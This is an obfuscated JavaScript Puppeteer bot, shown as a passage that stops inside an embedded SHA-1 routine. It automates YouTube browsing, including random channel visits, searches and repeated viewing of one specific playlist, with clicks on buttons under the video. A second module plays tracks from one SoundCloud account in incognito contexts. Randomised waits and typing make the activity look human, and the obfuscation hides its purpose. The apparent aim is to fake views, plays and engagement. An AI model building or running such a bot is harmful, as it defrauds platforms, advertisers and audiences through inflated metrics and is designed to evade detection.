const X = b,
  W = d,
  V = c;

function a() {
  const bn = [
    'strictions',
    'C3qSBxjIzwfZDa',
    'gCkTu8kgBmoqfSkvoSkZ',
    'e8kilqa7',
    ';\x20SM-A102U',
    'none',
    'ChrZlZmWmZeWlq',
    'z290BW',
    'DgLUzYbOywnRzq',
    'children',
    'e/youtube.',
    'lwXPzNqTD2vIlq',
    'w24aWQtdIvGhhH17',
    'apress',
    'ECkeWRGxAq',
    'CNzLCG',
    'yxn0lg1YyMvHCW',
    'UYrmqL3cOD',
    'eSkZWPn6',
    'y2fWDgnOywfP',
    'WOhcN8o4W4b/WQ7cJY7dMSkV',
    'kdZdGt7cU2NcJ8o8WOXq',
    'WPuqWORdMCoxW4hcKWS',
    'WOldRCk3oSoYAtybf8o9',
    'q24hW7VcJLyCbeG6',
    'AsiTW4KHz1WesCoj',
    'CMCVzw4VC2nYAq',
    ')\x20AppleWeb',
    'x19ZzwfYy2HcBW',
    'zs8Q',
    'https://gr'
  ];
  a = function() {
    return bn;
  };
  return a();
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x777 + 0x5e8 + 0x190))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1993 * 0x1 + 0x1 * -0x265 + 0x8 * 0x37f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x15 * 0x86b + -0x5fa6 + 0x1859d + (0x20c9 * -0x1 + -0x2ba3 + 0x2 * 0x4382) * random()) : await standardWaitForNetIdle(f), await wait(-0x55b * 0x1 + 0x14b6 + 0x42d + (-0x1421 + -0xe3 * -0x2e + 0x1267) * random()), -0x1 * 0x1e4a + 0x1c55 + 0x1f6;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1a54 + 0x15 * 0x1ae + -0xa * -0x10f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * 0x2437 + 0x67e + -0x155a * 0x2;
}
async function randomWait() {
  return await wait(-0x9a * -0x4 + 0x1b3 + 0xf6d + (0x10b + 0x1cab + -0x2 * 0x517) * random()), 0x2 * 0x1351 + -0xd * -0x89 + -0x2d96;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xb83 + 0x1cf1 + 0x3 * -0xd7c, -0x1c4d * 0x1 + 0x132 + 0x1b22), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1583 * -0xa + -0x1 * -0xc96a + -0xb628) * getRandomInt(0x1847 + -0x1 * 0x14bd + -0x388, 0x1d9e + 0xd76 + -0x2b0f), h)), 0x2123 * -0x1 + -0x18e3 + 0x5 * 0xb9b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1fe * -0x13 + 0x845 + -0x1 * -0x1d95;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x7 * 0x1d3 + 0x2 * 0x7f7 + -0x1cb2]['split']('\x20');
    for (let k = 0xb * 0x259 + -0x10 * -0x20b + -0x3a83; k < i['length']; k += 0xff2 * -0x2 + -0x1 * 0x1b1f + -0x1d * -0x209)
      j += i[k] * h[i[k + (-0x1 * 0x13a9 + 0x1a3 * -0x7 + 0x101 * 0x1f)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1bd0 + 0x1cab * -0x1 + 0x3881)['map'](l => Array['from'](l['children']))['flat'](0x2196 + -0x4a2 * -0x1 + -0x2637)['map'](l => l['childNodes'][-0x21d5 + -0xf9b + 0x3171]['childNodes'][0x1d7 + 0x599 * 0x4 + 0x183b * -0x1]['childNodes'][-0xea5 + 0x1324 + -0x47e]['childNodes'][0x1b54 + 0x2371 + 0x1 * -0x3ec5]['childNodes'][-0x2eb * -0x1 + 0x34 * -0x3d + 0x97a]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x519 * -0x2 + -0x1 * 0x529 + -0x121, 0xc39 + 0x3 * 0x2e2 + -0x157 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x37 * -0x44 + 0x42d0 + 0x664);
  const h = await getMaxTime(f),
    i = Math['min']((-0x8ec8 + 0x9002 + 0xe926) * getRandomInt(-0x114a + 0x186 + 0xfc6, -0x1 * 0xd69 + 0x1390 + 0x622 * -0x1), h);
  return await wait(i), -0xff6 + -0x1545 + 0x4 * 0x94f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const R = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])[R(0x9)][0x1a59 + 0x557 * -0x3 + -0xa54]['children'][-0x1509 * 0x1 + -0x3b * -0x71 + 0x502 * -0x1]['children'][0x1eb6 * -0x1 + 0x1 * 0xd00 + 0x11b6]['children'][-0x21 * 0x64 + 0x3eb * -0x3 + 0x18a5]['children'][0xad * 0x13 + 0x134a + 0x19 * -0x149]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2 * -0x11c3 + -0x3 * 0x86b + -0x92 * 0x12;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const T = b,
      S = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById'](S(0x1c) + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + T(0xe, '4f[['));
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2588 + -0x21e6 + -0x33e + (-0x3fe + 0xb05 + -0x6d5 * 0x1) * random()
  }), await wait(-0x676 + 0x2 * 0x3e1 + 0x1c * 0x6 + (-0x1 * 0x259c + 0x1 * -0x1ee6 + -0x45ae * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xaa5 * 0x1 + 0x708 * -0x1 + -0x39b]['childNodes'][0xc8b + -0x49 * 0x1 + -0xc41 * 0x1]['childNodes'][-0x952 + -0x6a1 * -0x5 + -0x17d2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xe4a + 0x1 * 0x6de + 0x1523 * -0x1]['childNodes'][0xe8 * 0x28 + 0x916 * 0x3 + -0x1 * 0x3f82]['childNodes'][0x4 * -0x48f + 0x10 * 0x258 + 0x3a * -0x55]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x23d5 + -0x1 * -0x17e9 + 0x47 * 0x2b),
          r = -0x2b * 0x72 + 0x726 * 0x3 + -0xc * 0x31;
        for (let u = -0xfe * 0x15 + 0xebc * 0x2 + -0x8a2; u < q['length']; u += -0x66 * 0x40 + 0x4ab * 0x7 + 0x16f * -0x5)
          r += q[u] * k[q[u + (0x136f + 0xe20 + 0x5 * -0x6b6)]];
        return r;
      }(n);
  });
  await wait((-0x139 * -0x1 + -0x8ad + 0x420c) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x586a * 0x5 + 0x3b6f * 0x1 + 0x23 * 0x11a1) * getRandomInt(0x35a + -0x962 + 0x5 * 0x135, 0x2f * -0x25 + -0x39 * 0x41 + 0x154e), h + (0x2ef + 0x170f + -0x676));
  return await wait(i), -0x3 * 0xb9b + 0x99 * 0x3d + 0x1a3 * -0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xf6 + 0x1a5e + 0x21 * -0xd4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2f * -0xbd + -0x1fe + 0x9 * 0x561 + (-0x205b + -0x735 + 0x2b78) * Math['random']());
    });
  }, 0x1 * -0x128f + -0xea3 + 0x7e * 0x7b);
  await wait(0xf7 * 0x389 + -0x3850 + 0x16301);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x13 * 0x134b + 0xf816 + 0x160db) * getRandomInt(-0x2d5 * -0x7 + -0x7 * -0x1d9 + -0x20be, -0xbbb + 0x2 * 0x12c5 + -0x19b6)), clearInterval(h), -0xb7d + 0x4de + -0x6a0 * -0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x5bc + -0x4e * 0x71 + -0x1415 * -0x2;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xfc4 + 0xa * 0x154 + 0x31 * 0xd;
    await randomWait();
  }
  return 0x20d8 + 0x1 * -0x30 + -0x20a7 * 0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0x3d * 0x6b + 0x16 * -0xa8 + -0xb0f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1 * 0xb26 + 0x2 * 0xb14 + 0x2 * -0x581 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x3 * -0x214 + -0x3a1 * -0x9 + -0x5 * 0x549 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x457 * -0x3 + -0x94f * -0x2 + 0x599 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x105ed + 0x11 * 0x512 + 0xac57 * -0x1 + getRandomInt(-0x2 * 0x1821 + -0x1d * -0x349 + 0xb95, 0x2088 * 0x7 + 0xbad * -0x5 + -0x3427));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x13 * -0x7a + -0xc42 + 0x71b * 0x3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x16a5 * -0x1 + 0x1 * -0x187 + 0xa8f * -0x2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x14a9 + 0x2b6 * -0x1 + 0x11f3 * -0x1, -0x1ea1 + -0xa * 0x6f + 0x1 * 0x2329)), v['includes']('script-des' + 'cription') ? (log('p1'), await s[U(0x7)](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * -0x26ff + 0x1 * 0x449 + -0x2378 + floor((0x18fd + 0x1 * -0x16cb + 0x2 * 0xdb) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x23075af1 * -0x2 + 0xdc23d188 + 0x2 * -0x511943b5),
          -0x1 * 0x56feaf + -0xcf23fb + 0xb * 0x26603e,
          -0xb47a + 0x107f + 0x123fb,
          0x2414 + 0x23b7 + -0x1 * 0x474b
        ], y = [
          -0xa * 0x13d + -0x80e + 0x1488,
          -0x1dd + 0xb3d + -0x2 * 0x4a8,
          0x1 * -0x543 + 0xc05 + 0x52 * -0x15,
          -0x1 * -0x18ef + 0x1 * -0x14e5 + 0x2 * -0x205
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1837 + 0x25e1 * -0x1 + 0x3e19)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x841 + -0xf * 0x22c + 0x28d5; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1575 + 0x863 + 0x2 * -0xeec) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2cf * -0x6 + -0x1 * 0x392 + 0x146c] = A[0x13c7 + 0xebf + -0x2276] = A[-0x24d6 + 0x23a1 + 0x136] = A[0xd * 0x35 + -0x10e7 * 0x2 + 0x1f1f] = A[0x46e + -0x191e + -0x1 * -0x14b3] = A[-0x1 * 0x22a7 + 0x1586 + -0x2a1 * -0x5] = A[0x1 * 0x1b43 + -0x9d7 * 0x1 + 0x37b * -0x5] = A[-0x2666 * -0x1 + -0x109 * 0xb + -0x1afd] = A[-0x1b2 + -0xdc9 + -0x1 * -0xf82] = A[0x1ebe + 0x40f * 0x8 + -0x3f2e] = A[-0x32 * 0x11 + 0x189d * 0x1 + -0x1542] = A[0xe4e + 0x10 * 0x227 + -0xc * 0x40f] = A[0x1 * 0x1850 + 0x259 * 0xb + 0x4 * -0xc86] = A[0x575 * -0x5 + 0x1bc8 + -0x73] = A[-0x1e99 + -0x3d * -0x3f + 0xfa3] = A[-0x50c + -0x1e * -0x26 + 0xa6] = A[-0x1c3e + 0x214d + -0x500] = 0x100b + -0x9 * -0x115 + -0x19c8, this['blocks'] = A) : this['blocks'] = [
                -0x9 * 0x9e + 0x1976 * -0x1 + 0x1f04,
                -0x11c3 + 0x2f * 0xa6 + -0xcb7,
                -0x400 + -0x25 * 0x5c + 0x114c,
                0x2694 + 0xd8a * -0x1 + -0x190a,
                0x6 * -0x559 + 0x14f1 + 0xb25,
                -0xe11 + -0x1087 * -0x2 + -0x12fd * 0x1,
                0x2 * 0x9b + -0x925 * -0x4 + -0x25ca,
                -0x5fc + 0x11ed + -0xbf1,
                -0x5a7 * -0x3 + 0xa78 + -0x1b6d,
                -0xb4a * -0x1 + -0x2 * 0x1031 + -0x10e * -0x14,
                0x70 * 0x1f + 0xc7 * -0x13 + 0x1 * 0x135,
                0x1ce1 * 0x1 + 0x2ed + -0x1fce,
                -0x1048 + 0x1 * -0xbe3 + 0x1c2b,
                0xdf * 0x23 + -0x46a + 0x1bd * -0xf,
                0x600 + 0x1 * -0x39b + 0x1 * -0x265,
                -0x17 * -0x127 + -0x25e4 + -0x247 * -0x5,
                0xab3 + 0x1 * 0xb69 + -0x161c
              ], this['h0'] = 0x18738fe * 0x40 + -0xc7 * 0x518187 + -0x1 * -0x44d29372, this['h1'] = -0xe1e91015 + 0x1 * 0x10569f34a + 0xcc4cc854, this['h2'] = -0xf3c37b01 + 0x25 * -0x2ac2705 + 0x1ef5ffbb8, this['h3'] = -0x714cffe + 0x33084a * -0x40 + 0x240936f4, this['h4'] = 0x1 * 0xf753abaf + 0x5bd89640 + -0x1 * 0x8f595fff, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x250d + 0xb28 + -0x3035, this['finalized'] = this['hashed'] = -0x1 * 0x1d8e + 0x8f1 + -0x6df * -0x3, this['first'] = -0x2217 + 0x610 + -0x3 * -0x958;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xa20 + 0x210c + 0x146 * -0x12, O = J['length'] || -0x1 * 0x8a4 + 0x2217 + -0x1973, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x164 * 0x1 + -0x9ac + -0x1d8 * -0x6, P[0x1990 + -0xb50 + -0xe40] = this['block'], P[-0x1ab + 0x1c99 + -0x1ade] = P[0x1486 + 0x3 * 0xc8f + -0x3a32] = P[0x880 + 0x6d5 + 0x1 * -0xf53] = P[-0x5 * 0x379 + -0x1b92 + 0x2cf2] = P[0xb3c * -0x1 + 0x52c + -0x614 * -0x1] = P[-0xc68 + 0x17f3 + -0x3b * 0x32] = P[-0x101c + 0x1673 + 0x4d * -0x15] = P[-0xc6d + -0x1396 + 0x200a] = P[-0x29 * -0xd + 0x27 * 0x62 + -0x10fb] = P[0x201e * -0x1 + -0x235d * 0x1 + 0x4384] = P[-0x1d6a + -0x1 * -0x1296 + 0x1a * 0x6b] = P[-0x1 * 0x215b + 0x97 * -0x1 + -0x21fd * -0x1] = P[-0x154a + -0xb16 + 0x81b * 0x4] = P[0x35d + -0x1 * -0x15c2 + -0x1912] = P[0x40b + 0xc82 + -0x107f] = P[0xcb7 + -0x5f7 * 0x5 + 0x112b] = 0x607 * -0x1 + 0x1bd9 + -0x15d2), K) {
                    for (N = this['start']; M < O && N < 0x1d52 + 0x12e * -0x6 + 0x466 * -0x5; ++M)
                      P[N >> 0x2 * 0xcdf + 0xc * 0xa9 + -0x21a8] |= J[M] << y[-0x1a67 * 0x1 + 0x235b + 0x1 * -0x8f1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2487 + -0x1e8 + -0x225f; ++M)
                      (L = J['charCodeAt'](M)) < 0x562 + 0x135b * -0x2 + 0x21d4 ? P[N >> -0x1 * -0xeb4 + 0x40d + 0x1 * -0x12bf] |= L << y[-0x16eb * -0x1 + 0x1 * 0x36e + -0x1a56 & N++] : L < 0xa * 0x1d6 + 0x164b + -0xd * 0x283 ? (P[N >> 0xa63 + -0xf04 * -0x1 + -0x1965] |= (-0x137d * -0x1 + 0x210f + 0x82 * -0x66 | L >> 0x1bbe + -0x1b5e + -0x5a) << y[-0x6eb + -0x113d + 0x17 * 0x10d & N++], P[N >> -0xafd + -0x2545 + -0x1 * -0x3044] |= (0x2 * 0xac7 + -0x11b5 + 0x359 * -0x1 | 0x5f2 + 0x119c + -0x174f & L) << y[-0x1545 + -0x1ae3 * 0x1 + 0x302b & N++]) : L < -0x1 * 0x102ee + 0x405 * 0x29 + 0x13621 || L >= -0x16e55 + -0x161 + 0x24fb6 ? (P[N >> -0x1216 + 0x1ba1 + -0x1 * 0x989] |= (0xe3 * 0x16 + -0x1227 + -0x7b | L >> -0x1 * 0xcaa + -0x14d0 + 0xe * 0x265) << y[-0x6a4 + -0x2a1 * 0xb + 0x2392 & N++], P[N >> -0x16fb + -0x225b + 0x3958] |= (-0x2094 + -0x872 + -0x1 * -0x2986 | L >> -0x97 * -0x31 + -0x2 * -0x66e + -0x29bd & -0x2e * -0x5 + -0x1ad4 + 0x1a2d * 0x1) << y[0x1b82 + -0xc77 + -0x3c2 * 0x4 & N++], P[N >> 0x1 * 0x39 + 0xf18 + -0xf4f] |= (0x2441 + -0x672 + -0x1d4f | 0x2f2 + -0xa1e + -0x1 * -0x76b & L) << y[-0x1d6 + -0x1979 * 0x1 + 0x1 * 0x1b52 & N++]) : (L = -0x1499 * 0x6 + -0x336c + 0x1af02 + ((-0x130a + -0x8 * 0x130 + -0x1 * -0x2089 & L) << -0x1e46 + -0x2 * 0x1229 + -0xb1b * -0x6 | -0x11 * -0x161 + -0x1 * -0x2137 + -0x34a9 & J['charCodeAt'](++M)), P[N >> 0x24cd + -0x1fae + -0x51d] |= (-0x463 * -0x4 + 0x2593 * 0x1 + -0x362f | L >> 0x120a + -0x1d * 0x83 + -0x321) << y[0x177b * -0x1 + -0x497 * 0x3 + 0x1 * 0x2543 & N++], P[N >> 0x1cd * -0x1 + 0x865 * -0x3 + -0x2 * -0xd7f] |= (0x16e4 + 0xb * 0x25f + -0x3079 | L >> -0x1a25 + 0x1f05 * -0x1 + 0x3936 & -0x172b + 0x62 * -0x2a + 0x277e) << y[0x2015 + 0x1228 + -0x323a & N++], P[N >> -0xaed + -0x80e + 0x1 * 0x12fd] |= (0xa8e * 0x1 + 0x90b + -0x1319 | L >> 0x4b * -0x14 + 0x49 * -0x6c + 0x24ae & -0x1f40 + 0x31 * -0x5b + 0x30ea) << y[-0x3b7 * -0x6 + -0x1 * 0xf9e + 0x5 * -0x155 & N++], P[N >> -0x1250 * -0x1 + -0x1 * 0x1581 + -0x9 * -0x5b] |= (0x143f + -0x24 * 0x89 + -0x29 * 0x3 | -0x5 * -0x430 + -0xe * 0x7d + -0xddb & L) << y[0x222b + -0x38 * 0x60 + -0xd28 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x48b + 0x1 * -0x170d + 0x1bd8 ? (this['block'] = P[-0x7a1 + 0x1 * 0x681 + 0x130 * 0x1], this['start'] = N - (0x25ae + 0xf4d * 0x1 + -0x34bb), this['hash'](), this['hashed'] = -0x164 + -0x22a1 + 0x2406) : this['start'] = N;
                }
                return this['bytes'] > 0x922f67a4 + 0xac * 0xf8acb2 + -0x40f * 0xe1bf3 && (this['hBytes'] += this['bytes'] / (0x29791454 + 0x911c7774 + 0x456a7438) << 0x11d8 * -0x1 + 0x16c8 + -0x4f0, this['bytes'] = this['bytes'] % (-0x1d639 * 0x6888 + -0xbb603fc * -0x22 + 0x1 * 0x31d46ed0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x575 + -0x4a * 0x32 + -0x13ea * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2186 + 0x4c7 * 0x5 + -0x3959 * 0x1] = this['block'], J[K >> -0x183 * 0x9 + 0x1ac3 + -0xd26] |= x[0x19 * 0x107 + 0xb5b + -0x2507 & K], this['block'] = J[0x167e * 0x1 + -0x3 * 0x2cb + -0x1 * 0xe0d], K >= -0x1 * 0x1628 + -0x1629 + -0xd * -0x36d && (this['hashed'] || this['hash'](), J[-0x1d * 0x9e + -0x1 * -0x20af + 0xec9 * -0x1] = this['block'], J[-0x241 * -0x11 + -0x3aa + -0x7 * 0x4f1] = J[0x1 * 0xc89 + -0xe8f + 0x207] = J[0x2 * 0x1046 + 0x59 * -0x1 + -0x2031] = J[0x1 * -0x26a9 + -0x22e1 + 0x498d] = J[-0x2346 + 0x22ee * -0x1 + 0x4638] = J[0x4 * -0x570 + -0x148b + 0x2a50] = J[-0x142f + -0x1b37 + 0xbdb * 0x4] = J[-0x1079 + -0x5d * -0x5a + -0x1032] = J[0x1eb * 0x1 + -0x1 * -0x1ad7 + -0x1cba] = J[-0x2 * -0x107d + -0x171a + -0x1 * 0x9d7] = J[0x116 * -0x8 + -0x1 * 0x2179 + 0x2a33] = J[0x1 * 0x56 + -0x2 * 0xc7a + 0x6b * 0x3b] = J[-0x8d3 + -0x175b * -0x1 + -0xe7c] = J[-0x1769 + 0x1 * 0xd + 0x1769] = J[0x26b7 + -0x1d6e + -0x93b] = J[-0x2693 + 0x2 * -0x88f + 0x1 * 0x37c0] = -0x12f8 + 0xb7b * -0x1 + 0x1e73), J[0xca1 + -0x1a79 + -0xde6 * -0x1] = this['hBytes'] << 0x7 * -0x250 + -0x1f02 + 0x2f35 | this['bytes'] >>> -0x732 + 0x6f + 0x6e0, J[0xee * 0x5 + -0x2329 * 0x1 + 0x1e92] = this['bytes'] << -0x72 * 0x47 + -0x17fd + -0x3f * -0xe2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x245b + -0x5e * -0x2b + 0x14a1; J < 0x2156 + -0x2675 + 0x6b * 0xd; ++J)
                K = Q[J - (-0x1334 * 0x1 + -0x40d * 0x3 + -0x6e * -0x49)] ^ Q[J - (0x1b22 + -0x2 * -0xe80 + 0x1c0d * -0x2)] ^ Q[J - (-0x9cb + -0x1b23 * 0x1 + 0x93f * 0x4)] ^ Q[J - (-0x8cf + -0x1 * 0xaf + -0x4c7 * -0x2)], Q[J] = K << -0x89b + 0xe + 0x88e | K >>> 0xcf4 + -0x43f * 0x9 + 0xcb1 * 0x2;
